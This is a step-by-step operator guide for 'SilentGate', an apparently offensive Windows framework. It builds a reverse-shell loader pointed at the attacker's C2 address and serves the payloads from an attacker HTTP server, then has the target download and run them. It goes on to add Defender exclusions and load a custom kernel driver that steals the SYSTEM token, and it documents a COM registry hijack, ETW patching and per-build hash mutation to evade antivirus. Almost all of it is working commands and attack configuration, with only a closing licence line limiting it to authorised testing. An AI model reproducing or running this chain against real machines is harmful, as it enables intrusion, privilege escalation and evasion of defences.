# SilentGate - Complete Practical Guide
**Author: JarDani**

---

## Overview

SilentGate is a Windows evasion framework that achieves shells with zero UAC and zero detections on Windows 10 and Windows 11. This guide walks through everything from setup to SYSTEM shell.

---

## Lab Requirements

| Machine    | Role     | OS                 |
|------------|----------|--------------------|
| Kali Linux | Attacker | Kali 2026.x        |
| Windows 10 | Target   | Win10 22H2 19045.x |
| Windows 11 | Target   | Win11 26200.x      |

Tools needed on Kali:
```bash
sudo apt install mingw-w64 osslsigncode python3 netcat-openbsd
```

---

## Step 1 — Clone and Configure

```bash
git clone https://github.com/JarDaNi686/SilentGate.git
cd SilentGate
```

Set your C2 IP and port in sg_loader.c:

```c
#define C2_IP   0xYOURIP    // Your Kali IP in network byte order
#define C2_PORT 0xYOURPORT  // Your listener port in network byte order
```

How to calculate hex values:
```python
import socket, struct
ip = struct.unpack(">I", socket.inet_aton("192.168.1.100"))[0]
print(f"C2_IP = 0x{ip:08X}")
# Port 443  = 0xBB01
# Port 4444 = 0x5C11
# Port 8443 = 0x1B20
```

Also set your IP in sg_chain.ps1:
```powershell
$kali = "YOUR_C2_IP"
$port = 443
```

---

## Step 2 — Compile

```bash
# Main shell
x86_64-w64-mingw32-gcc output/sg_loader.c \
    -o output/sg_loader.exe \
    -lws2_32 -O2 -mwindows \
    -DC2_IP=0xYOURIP -DC2_PORT=0xYOURPORT

# Chain launcher
x86_64-w64-mingw32-gcc output/sg_chain.c \
    -o output/sg_chain.exe \
    -lole32 -ladvapi32 -O2

# Token stealer
x86_64-w64-mingw32-gcc tests/steal_token.c \
    -o tests/steal_token.exe -O2 -mwindows

# PPL remover
x86_64-w64-mingw32-gcc tests/remove_ppl.c \
    -o tests/remove_ppl.exe -lpsapi -O2

# Win11 payload DLL
x86_64-w64-mingw32-gcc output/sg_payload_win11.c \
    -shared -o output/sg_payload_win11.dll -O2 -lkernel32

# Math payload DLL
x86_64-w64-mingw32-gcc output/sg_payload_math.c \
    -shared -o output/sg_payload_math.dll -O2 -lkernel32
```

---

## Step 3 — Start HTTP Server on Kali

```bash
cd ~/SilentGate
python3 -m http.server 8080
```

---

## Step 4 — Start Listener

```bash
sudo nc -lvnp 443
```

---

## Step 5 — Deploy on Target (Standard User - No UAC)

### Option A — PowerShell Chain (Recommended)

```powershell
Invoke-WebRequest -Uri "http://KALI_IP:8080/output/sg_chain.ps1" -OutFile "$env:TEMP\sg_chain.ps1"
powershell -ep bypass -f "$env:TEMP\sg_chain.ps1"
```

### Option B — Direct Shell

```powershell
Invoke-WebRequest -Uri "http://KALI_IP:8080/output/sg_loader.exe" -OutFile "$env:TEMP\sl.exe"
& "$env:TEMP\sl.exe"
```

---

## Step 6 — Shell Connects

Check Kali nc listener. Verify integrity:

```cmd
whoami
whoami /groups | findstr "Mandatory"
```

---

## Step 7 — Escalate to SYSTEM

The kernel driver gives SYSTEM shell. One-time admin setup required.

### 7a — Install Certificate (Admin once)

```powershell
certutil -addstore TrustedPublisher output/v9/sg_test.crt
certutil -addstore Root output/v9/sg_test.crt
```

### 7b — Load Kernel Driver (Admin once)

```powershell
# Add Defender exclusion
Add-MpPreference -ExclusionPath "C:\ProgramData\lpe"
Add-MpPreference -ExclusionPath "C:\test\v9"

# Download driver
New-Item -ItemType Directory -Path "C:\test\v9" -Force | Out-Null
Invoke-WebRequest -Uri "http://KALI_IP:8080/output/v9/sg_driver_signed.sys" -OutFile "C:\test\v9\sg_driver.sys"

# Load with auto-start
sc.exe create SilentGate binPath= "C:\test\v9\sg_driver.sys" type= kernel start= auto
sc.exe start SilentGate
sc.exe query SilentGate | findstr STATE
```

Expected: STATE : 4 RUNNING

### 7c — Get SYSTEM Shell (Standard User - No UAC - No Admin)

After driver loaded - any standard user on that machine forever:

```powershell
New-Item -ItemType Directory -Path "C:\ProgramData\lpe" -Force | Out-Null
Invoke-WebRequest -Uri "http://KALI_IP:8080/output/sg_loader.exe" -OutFile "C:\ProgramData\lpe\sg_loader.exe"
Invoke-WebRequest -Uri "http://KALI_IP:8080/tests/steal_token.exe" -OutFile "C:\ProgramData\lpe\steal_token.exe"
powershell -ep bypass -f "$env:TEMP\sg_chain.ps1"
```

Expected on Kali:

C:\Windows\system32> whoami
nt authority\system
Mandatory Label\System Mandatory Level


---

## Chain Waterfall Logic

sg_chain.ps1:

Level 0 steal_token.exe
Opens \.\SilentGate device
IOCTL 0x00222410
Kernel steals SYSTEM token from PID 4
Injects token into calling process
Launches sg_loader.exe as SYSTEM
→ SYSTEM shell

Level 1 Kernel IOCTL via PowerShell P/Invoke
Same as Level 0 directly from PS
→ SYSTEM shell

Level 2 COM LocalServer32 hijack
CLSID {32BA16FD} cttunesvr.exe
Writes HKCU registry key
Triggers COM activation
Cleans registry after
→ Medium shell - Zero UAC - Works Win10+Win11

Level 3 Direct sg_loader.exe
Standard reverse shell fallback
→ Medium shell


---

## Kernel Driver Reference

File: output/v9/sg_driver_signed.sys
Device: \.\SilentGate

IOCTLs:
0x00222408 Read virtual memory
0x0022240C Write virtual memory
0x00222410 Steal SYSTEM token
0x00222414 Registry write
0x00222418 Registry delete

EPROCESS offsets (Win10 22H2 19045):
Token: 0x4B8
UniqueProcessId: 0x440
ActiveProcessLinks: 0x448


---

## Mathematical Evasion Reference (v8)

| Technique              | Purpose                       |
|------------------------|-------------------------------|
| GF(2^8) arithmetic     | Anti-sandbox verification     |
| Lorenz chaos attractor | Unique timing per run         |
| Kolmogorov complexity  | Entropy evasion               |
| Poisson sleep          | Timing fingerprint evasion    |
| PEB walk               | No suspicious API imports     |
| ETW patch              | Telemetry blind spot          |

---

## Quantum Pattern Mutator

Every build has different MD5 hash - Defender cannot signature it:

```bash
bash core/build_quantum.sh
```

Output:

[QUANTUM] Lorenz: sigma=10.264 rho=28.230 beta=2.832
[QUANTUM] GF poly: 0x12B
[QUANTUM] Sleep: 3245+rand%2664
d92f04b7... steal_token_quantum.exe
[QUANTUM] Build complete - unique binary ready


---

## Test Results

| Target           | Shell  | Integrity | UAC  | Detections |
|------------------|--------|-----------|------|------------|
| Win10 19045.6456 | SYSTEM | System    | Zero | Zero       |
| Win11 26200.8875 | Medium | Medium    | Zero | Zero       |

---

## Troubleshooting

**Shell not connecting:**
- Verify nc is listening: sudo nc -lvnp 443
- Check C2_IP and C2_PORT hex values are correct
- Check outbound firewall on target

**Defender catching files:**
- Rebuild with quantum mutator
- Run from excluded path C:\ProgramData\lpe
- Verify exclusion was added by admin

**IOCTL fails / Medium shell instead of SYSTEM:**
- Check driver running: sc.exe query SilentGate findstr STATE
- Confirm exclusion on C:\ProgramData\lpe
- Verify sg_loader.exe is in C:\ProgramData\lpe

**Driver not loading:**
- Verify cert installed in TrustedPublisher store
- Check test signing mode or use our signed driver
- Run as admin for one-time setup

---

## File Reference

| File                           | Purpose                             |
|--------------------------------|-------------------------------------|
| output/sg_loader.c             | Main shell source - set C2 here     |
| output/sg_loader.exe           | Compiled shell binary               |
| output/sg_chain.ps1            | Unified launcher - set IP here      |
| output/sg_chain.c              | C version of chain launcher         |
| output/sg_payload_math.dll     | Math obfuscated payload DLL         |
| output/sg_payload_win11.dll    | Win11 COM hijack payload            |
| output/v9/sg_driver.c          | Kernel driver source                |
| output/v9/sg_driver_signed.sys | Signed kernel driver                |
| output/v9/sg_test.crt          | Test signing certificate            |
| output/v9/sg_test.pfx          | Certificate bundle (keep private)   |
| tests/steal_token.c            | SYSTEM token steal source           |
| tests/steal_token.exe          | Token stealer binary                |
| tests/remove_ppl.c             | PPL removal source                  |
| tests/remove_ppl.exe           | PPL removal binary                  |
| tests/sg_driver_test.c         | Driver connectivity test            |
| core/quantum_mutate.py         | Quantum pattern mutator             |
| core/build_quantum.sh          | Build unique binary script          |
| core/v8_galois_encoder.py      | GF(2^8) encoder                     |
| core/v8_chaos_mutator.py       | Lorenz chaos mutator                |
| core/v8_kolmogorov.py          | Kolmogorov complexity engine        |

---

## Author

JarDani

## License

MIT — For authorised penetration testing and security research only.
